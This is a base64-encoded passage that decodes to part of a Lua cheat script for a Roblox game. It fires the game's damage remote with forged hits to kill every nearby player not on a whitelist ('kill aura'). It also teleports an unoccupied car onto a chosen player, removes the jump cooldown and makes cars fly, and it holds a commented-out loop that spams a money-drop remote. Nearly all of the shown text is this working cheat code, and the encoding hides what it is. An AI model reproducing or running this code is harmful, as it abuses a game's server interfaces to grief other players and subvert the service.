CAgICAgICAgICAgICAgICAgICAgIDEsCiAgICAgICAgICAgICAgICAgICAgICAgIDEsCiAgICAgICAgICAgICAgICAgICAgICAgIHJhd2dldChkYXRhLCAidG9vbCIpLkd1blNjcmlwdF9Mb2NhbC5CbG9vZEVmZmVjdAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICAwLjIsCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDM2OTYxNDQ5NzIKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgNywKICAgICAgICAgICAgICAgICAgICAgICAgMQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBmYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgOCwKICAgICAgICAgICAgICAgICAgICAgICAgdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgMTYzMDY0MTAyCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIDEsCiAgICAgICAgICAgICAgICAgICAgICAgIDEuNSwKICAgICAgICAgICAgICAgICAgICAgICAgMSwKICAgICAgICAgICAgICAgICAgICAgICAgZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgIHJhd2dldChkYXRhLCAidG9vbCIpLkd1blNjcmlwdF9Mb2NhbC5FeHBsb3Npb25FZmZlY3QKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAuMTAwMDAwMDAxNDkwMTIsIDAsIDApLAogICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMC4xMDAwMDAwMDE0OTAxMiwgMCwgMCksCiAgICAgICAgICAgICAgICAgICAgICAgIHJhd2dldChkYXRhLCAidG9vbCIpLkd1blNjcmlwdF9Mb2NhbC5UcmFjZXJFZmZlY3QsCiAgICAgICAgICAgICAgICAgICAgICAgIG5pbCwKICAgICAgICAgICAgICAgICAgICAgICAgcmF3Z2V0KGRhdGEsICJ0b29sIikuR3VuU2NyaXB0X0xvY2FsLlBhcnRpY2xlRWZmZWN0LAogICAgICAgICAgICAgICAgICAgICAgICAzMDAsCiAgICAgICAgICAgICAgICAgICAgICAgIDUyNiwKICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy56ZXJvLAogICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLjQwMDAwMDAwNTk2MDQ2LCAwLjQwMDAwMDAwNTk2MDQ2LCAwLjQwMDAwMDAwNTk2MDQ2KSwKICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3IzLm5ldygwLjYzOTIxNTcwNzc3ODkzLCAwLjYzNTI5NDEzOTM4NTIyLCAwLjYxMTc2NDcyOTAyMjk4KSwKICAgICAgICAgICAgICAgICAgICAgICAgMSwKICAgICAgICAgICAgICAgICAgICAgICAgRW51bS5NYXRlcmlhbC5OZW9uLAogICAgICAgICAgICAgICAgICAgICAgICBFbnVtLlBhcnRUeXBlLkN5bGluZGVyLAogICAgICAgICAgICAgICAgICAgICAgICBmYWxzZSwKICAgICAgICAgICAgICAgICAgICAgICAgNjY5NjU0MzgwOSwKICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMC4wMDcwMDAwMDAyMTYwNjY4LCAwLjAwNzAwMDAwMDIxNjA2NjgsIDAuMDA3MDAwMDAwMjE2MDY2OCkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjY5NTE0ODY5LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjY5NTE0ODg3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjY5NTE0ODA3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMjY5NTE0ODE3CiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIDAuNSwKICAgICAgICAgICAgICAgICAgICAgICAgMSwKICAgICAgICAgICAgICAgICAgICAgICAgMS41LAogICAgICAgICAgICAgICAgICAgICAgICAxMDAKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgIDMsCiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yMy5uZXcoMSwgMC42NDcwNTg4NDQ1NjYzNSwgMC42MDAwMDAwMjM4NDE4NiksCiAgICAgICAgICAgICAgICAgICAgICAgIDYsCiAgICAgICAgICAgICAgICAgICAgICAgIHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KSkKCiAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5JbmZsaWN0VGFyZ2V0OkZpcmVTZXJ2ZXIodGFibGUudW5wYWNrKHsKICAgICAgICAgICAgICAgICAgICByYXdnZXQoZGF0YSwgInRvb2wiKSwKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllciwKICAgICAgICAgICAgICAgICAgICByYXdnZXQoZGF0YSwgInRhcmdldCIpLkNoYXJhY3Rlci5IdW1hbm9pZCwKICAgICAgICAgICAgICAgICAgICByYXdnZXQoZGF0YSwgInRhcmdldCIpLkNoYXJhY3RlcltocGFydF0sCiAgICAgICAgICAgICAgICAgICAgZGFtYWdlLAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgIGZhbHNlLAogICAgICAgICAgICAgICAgICAgICAgICByYXdnZXQoZGF0YSwgInRvb2wiKS5HdW5TY3JpcHRfU2VydmVyLklnbml0ZVNjcmlwdCwKICAgICAgICAgICAgICAgICAgICAgICAgcmF3Z2V0KGRhdGEsICJ0b29sIikuR3VuU2NyaXB0X1NlcnZlci5JY2lmeVNjcmlwdCwKICAgICAgICAgICAgICAgICAgICAgICAgMTAwLAogICAgICAgICAgICAgICAgICAgICAgICAxMDAKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgIDUsCiAgICAgICAgICAgICAgICAgICAgICAgIDMKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHJhd2dldChkYXRhLCAidGFyZ2V0IikuQ2hhcmFjdGVyW2hwYXJ0XSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZhbHNlLAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAxOTMwMzU5NTQ2CiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIDEsCiAgICAgICAgICAgICAgICAgICAgICAgIDEuNSwKICAgICAgICAgICAgICAgICAgICAgICAgMQogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgcmF3Z2V0KGRhdGEsICJoaXRwb3MiKSwKICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLjA3NDQ1NjAzNjA5MDg1MSwgLTAuMDk5Nzc1NzkxMTY4MjEzLCAtMC45OTIyMjAyMjI5NDk5OCksCiAgICAgICAgICAgICAgICAgICAgdHJ1ZQogICAgICAgICAgICAgICAgfSkpCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGdldGdlbnYoKS5raWxsX2d1biA9IGtpbGxfZ3VuCgogICAgICAgICAgICB0YXNrLnNwYXduKExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIHRhc2sud2FpdCgxKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguS2lsbEF1cmEgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRvb2wiKTpGaW5kRmlyc3RDaGlsZCgiU2V0dGluZyIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBQbGF5ZXJzOkdldFBsYXllcnMoKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0YWJsZS5maW5kKGxpYnJhcnkud2hpdGVsaXN0LCB0b3N0cmluZyhWYWx1ZSkpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlID09IExvY2FsUGxheWVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBWYWx1ZS5DaGFyYWN0ZXIgb3Igbm90IFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgb3Igbm90IFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikuSGVhbHRoID09IDAgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWUuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiRm9yY2VGaWVsZCIpIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgRGlzdGFuY2VDaGVjayhWYWx1ZSwgQ29uZmlnLlRoZUJyb254LktpbGxBdXJhUmFuZ2UpIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBraWxsX2d1bih0b3N0cmluZyhWYWx1ZSksICdIZWFkJywgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBsb2NhbCBHZXRfVmVoaWNsZSA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLkNpdkNhcnM6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiRHJpdmVTZWF0IikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgVmFsdWUuRHJpdmVTZWF0Lk9jY3VwYW50IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFZhbHVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLkJ1Z1BsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpIG9yIG5vdCBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKENvbmZpZy5UaGVCcm9ueC5QbGF5ZXJVdGlsaXRpZXMuU2VsZWN0ZWRQbGF5ZXIpLkNoYXJhY3RlciBvciBub3QgUGxheWVyczpGaW5kRmlyc3RDaGlsZChDb25maWcuVGhlQnJvbnguUGxheWVyVXRpbGl0aWVzLlNlbGVjdGVkUGxheWVyKS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIGNvbnRpbnVlIGVuZCAgICAgICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIENhcl9Ub19Vc2UgPSBHZXRfVmVoaWNsZSgpCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDYXJfVG9fVXNlIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENhcl9Ub19Vc2U6RmluZEZpcnN0Q2hpbGQoIkRyaXZlU2VhdCIpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgQ2FyX1RvX1VzZTpGaW5kRmlyc3RDaGlsZCgiRHJpdmVTZWF0IikuT2NjdXBhbnQgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENhcl9Ub19Vc2U6R2V0QXR0cmlidXRlKCJVc2FibGUiKSBvciBDYXJfVG9fVXNlOkdldEF0dHJpYnV0ZSgiVXNhYmxlIikgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBDYXJfVG9fVXNlLkRyaXZlU2VhdDpTaXQoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkKQoKICAgICAgICAgICAgICAgICAgICAgICAgQ2FyX1RvX1VzZTpTZXRBdHRyaWJ1dGUoIlVzYWJsZSIsIHRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQoKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5KdW1wID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ2FyX1RvX1VzZS5QcmltYXJ5UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIENhcl9Ub19Vc2UuUHJpbWFyeVBhcnQgPSBDYXJfVG9fVXNlLkJvZHk6RmluZEZpcnN0Q2hpbGQoIiNXZWlnaHQiKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBDYXJfVG9fVXNlOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRoZUJyb254LlBsYXllclV0aWxpdGllcy5TZWxlY3RlZFBsYXllcikuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikuQ0ZyYW1lKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICAtLVtbdGFzay5zcGF3bihMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpIC0tIG9sZCBhdXRvIGRyb3AKICAgICAgICAgICAgICAgIHdoaWxlIHRhc2sud2FpdCguMjUpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5UaGVCcm9ueC5BdXRvRHJvcCB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiQmFua1Byb2Nlc3NSZW1vdGUiKTpJbnZva2VTZXJ2ZXIoIkRyb3AiLCB0b3N0cmluZyhDb25maWcuVGhlQnJvbnguTW9uZXlBbW91bnQpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpXV0KCmxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQoKVXNlcklucHV0U2VydmljZS5KdW1wUmVxdWVzdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgaWYgbm90IHBsYXllciB0aGVuIHJldHVybiBlbmQKICAgIAogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIHJldHVybiBlbmQKICAgIAogICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiSHVtYW5vaWQiKQogICAgaWYgbm90IGh1bWFub2lkIHRoZW4gcmV0dXJuIGVuZAoKICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguUGxheWVyTW9kaWZpY2F0aW9ucy5Ob0p1bXBDb29sZG93biB0aGVuCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBpZiBodW1hbm9pZC5GbG9vck1hdGVyaWFsID09IEVudW0uTWF0ZXJpYWwuQWlyIHRoZW4KICAgICAgICByZXR1cm4KICAgIGVuZAogICAgCiAgICBpZiBodW1hbm9pZC5KdW1wIG9yIGh1bWFub2lkOkdldFN0YXRlKCkgPT0gRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5KdW1waW5nIHRoZW4KICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuSnVtcGluZykKZW5kKQogICAgCgotLVtbdGVzdCBjYXJmbHkKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBVSVMgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQoKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGh1bSwgc2VhdCwgY2FyLCBidiwgYmcKCmxvY2FsIGZ1bmN0aW9uIFNldHVwKCkKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGVuZAoKICAgIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICBpZiBub3QgaHVtIHRoZW4gcmV0dXJuIGVuZAoKICAgIHNlYXQgPSBodW0uU2VhdFBhcnQKICAgIGlmIG5vdCBzZWF0IG9yIG5vdCBzZWF0OklzQSgiVmVoaWNsZVNlYXQiKSB0aGVuIHJldHVybiBlbmQKCiAgICBjYXIgPSBzZWF0LlBhcmVudAogICAgaWYgbm90IGNhciB0aGVuIHJldHVybiBlbmQKCiAgICBsb2NhbCBwcmltYXJ5ID0gY2FyLlByaW1hcnlQYXJ0IG9yIGNhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIG9yIHNlYXQKICAgIGlmIG5vdCBwcmltYXJ5IHRoZW4gcmV0dXJuIGVuZAoKICAgIGlmIG5vdCBidiB0aGVuCiAgICAgICAgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldygxZTcsIDFlNywgMWU3KQogICAgICAgIGJ2LlZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgYnYuUGFyZW50ID0gcHJpbWFyeQogICAgZW5kCgogICAgaWYgbm90IGJnIHRoZW4KICAgICAgICBiZyA9IEluc3RhbmNlLm5ldygiQm9keUd5cm8iKQogICAgICAgIGJnLk1heFRvcnF1ZSA9IFZlY3RvcjMubmV3KDFlNywgMWU3LCAxZTcpCiAgICAgICAgYmcuUCA9IDE1MDAwCiAgICAgICAgYmcuRCA9IDEyMDAKICAgICAgICBiZy5QYXJlbnQgPSBwcmltYXJ5CiAgICBlbmQKZW5kCgpSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihkdCkKICAgIGlmIG5vdCBDb25maWcuVGhlQnJvbnguY2FyZmx5IHRoZW4KICAgICAgICBpZiBidiB0aGVuCiAgICAgICAgICAgIGJ2OkRlc3Ryb3koKQogICAgICAgICAgICBidiA9IG5pbAogICAgICAgIGVuZAogICAgICAgIGlmIGJnIHRoZW4KICAgICAgICAgICAgYmc6RGVzdHJveSgpCiAgICAgICAgICAgIGJnID0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIAogICAgICAgIG9yIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikuU2VhdFBhcnQgCiAgICB0aGVuCiAgICAgICAgaWYgYnYgdGhlbiBidi5WZWxvY2l0eSA9IFZlY3RvcjMuemVybyBlbmQKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGlmIG5vdCBodW0gb3IgaHVtLlBhcmVudCB+PSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgIFNldHVwKCkKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGlmIG5vdCBzZWF0IG9yIG5vdCBzZWF0OklzQSgiVmVoaWNsZVNlYXQiKSB0aGVuCiAgICAgICAgU2V0dXAoKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgcm9vdCA9IGNhci5QcmltYXJ5UGFydAogICAgaWYgbm90IHJvb3QgdGhlbiByZXR1cm4gZW5kCgogICAgU2V0dXAoKQoKICAgIGxvY2FsIHNwZWVkID0gQ29uZmlnLlRoZUJyb254LmNhcmZseXNwZWVkIG9yIDUwCgogICAgbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgIGxvY2FsIGNhbUxvb2sgPSBjYW0uQ0ZyYW1lLkxvb2tWZWN0b3IKICAgIGxvY2FsIGNhbVJpZ2h0ID0gY2FtLkNGcmFtZS5SaWdodFZlY3RvcgoKICAgIGlmIGJnIHRoZW4KICAgICAgICBpZiBVSVM6SXNNb3VzZUJ1dHRvblByZXNzZWQoRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMikgdGhlbgogICAgICAgICAgICBiZy5DRnJhbWUgPSBDRnJhbWUubmV3KHJvb3QuUG9zaXRpb24sIHJvb3QuUG9zaXRpb24gKyBjYW1Mb29rKQogICAgICAgIGVuZAogICAgZW5kCgogICAgLS0g4pyUIEhBUkVLRVQKICAgIGxvY2FsIG1vdmVEaXIgPSBWZWN0b3IzLnplcm8KICAgIGlmIFVJUzpJc0tleURvd24oRW51bS5LZXlDb2RlLlcpIHRoZW4gbW92ZURpciArPSBjYW1Mb29rIGVuZAogICAgaWYgVUlTOklzS2V5RG93bihFbnVtLktleUNvZGUuUykgdGhlbiBtb3ZlRGlyIC09IGNhbUxvb2sgZW5kCiAgICBpZiBVSVM6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5BKSB0aGVuIG1vdmVEaXIgLT0gY2FtUmlnaHQgZW5kCiAgICBpZiBVSVM6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5EKSB0aGVuIG1vdmVEaXIgKz0gY2FtUmlnaHQgZW5kCgogICAgaWYgbW92ZURpci5NYWduaXR1ZGUgPiAwIGFuZCBidiB0aGVuCiAgICAgICAgYnYuVmVsb2NpdHkgPSBtb3ZlRGlyLlVuaXQgKiBzcGVlZAogICAgZWxzZWlmIGJ2IHRoZW4KICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgZW5kCmVuZCkKLS10ZXN0IGNhcmZseSBlbmRdXQoKLS0gQ0FSIEZMWSBGSU5BTCBGSVhFRApsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFVJUyA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCgpsb2NhbCBMUCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgaHVtLCBzZWF0LCBjYXIsIHJvb3QKbG9jYWwgYnYsIGJnCmxvY2FsIGxhc3RDYXIKCmxvY2FsIGZ1bmN0aW9uIENsZWFudXAoKQogICAgaWYgYnYgdGhlbiBidjpEZXN0cm95KCkgYnYgPSBuaWwgZW5kCiAgICBpZiBiZyB0aGVuIGJnOkRlc3Ryb3koKSBiZyA9IG5pbCBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTZXR1cCgpCiAgICBDbGVhbnVwKCkKCiAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LmNhcmZseSB0aGVuIHJldHVybiBlbmQKCiAgICBsb2NhbCBjaGFyID0gTFAuQ2hhcmFjdGVyCiAgICBpZiBub3QgY2hhciB0aGVuIHJldHVybiBlbmQKCiAgICBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKICAgIGlmIG5vdCBodW0gdGhlbiByZXR1cm4gZW5kCgogICAgc2VhdCA9IGh1bS5TZWF0UGFydAogICAgaWYgbm90IHNlYXQgb3Igbm90IHNlYXQ6SXNBKCJWZWhpY2xlU2VhdCIpIHRoZW4gcmV0dXJuIGVuZAoKICAgIGNhciA9IHNlYXQuUGFyZW50CiAgICBpZiBub3QgY2FyIHRoZW4gcmV0dXJuIGVuZAoKICAgIHJvb3QgPSBjYXIuUHJpbWFyeVBhcnQKICAgIGlmIG5vdCByb290IHRoZW4gcmV0dXJuIGVuZAoKICAgIGxhc3RDYXIgPSBjYXIKCiAgICBmb3IgXywgdiBpbiBpcGFpcnMoY2FyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgYW5kIG5vdCB2Lk5hbWU6bG93ZXIoKTpmaW5kKCJ3aGVlbCIpIHRoZW4KICAgICAgICAgICAgdi5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGJ2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldygxZTksIDFlOSwgMWU5KQogICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgIGJ2LlBhcmVudCA9IHJvb3QKCiAgICBiZyA9IEluc3RhbmNlLm5ldygiQm9keUd5cm8iKQogICAgYmcuTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoMWU5LCAxZTksIDFlOSkKICAgIGJnLlAgPSAyNTAwMAogICAgYmcuRCA9IDE1MDAKICAgIGJnLkNGcmFtZSA9IHJvb3QuQ0ZyYW1lCiAgICBiZy5QYXJlbnQgPSByb290CmVuZAoKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIHRhc2sud2FpdCgwLjIpCgogICAgICAgIGxvY2FsIGNoYXIgPSBMUC5DaGFyYWN0ZXIKICAgICAgICBpZiBub3QgY2hhciB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICBsb2NhbCBoID0gY2hhcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKC